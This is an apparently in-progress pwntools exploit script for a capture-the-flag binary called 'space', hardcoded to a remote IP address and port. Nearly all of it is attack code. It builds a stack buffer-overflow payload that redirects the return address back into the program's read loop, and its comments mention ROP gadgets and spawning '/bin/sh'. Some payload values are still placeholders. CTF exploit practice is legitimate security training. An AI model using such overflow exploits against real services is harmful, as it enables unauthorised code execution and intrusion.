#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 165.232.46.223 --port 30496
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './space'

space = ELF(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '165.232.46.223'
port = int(args.PORT or 30496)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

gdbscript = '''
b *0x80491ca
b *0x8049222
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# payload = p32(0xF7FB4D14)
# payload += p32(0x88888888)
# payload += p32(0x00000000)
# payload += b'aaaaaaaaaaaaa'

# 18: aaaabaaacaaadaaaea
#     /bin/sh -c /bin/sh
#payload = p32(0x00000000)
payload = b'\x11\x11\x11'
payload += cyclic(15) # also have stack addesses here?
#payload += p32(0x080491a1) # 0x080491a1 : nop ; pop ebp ; ret
payload += p32(0x804921a) # back to main read loop
payload += p32(0x00011111)
payload += p32(0xAAAAAAAA)
payload += p32(0xBBBBBBBB)


io.send(payload)

io.interactive()


# 0x08049175 : add eax, 0x804b2ec ; add ecx, ecx ; ret
# 0x100000000 = 4294967296
# 0x804b2ec = 134525676
# 0xF7FB4D14 = 4160441620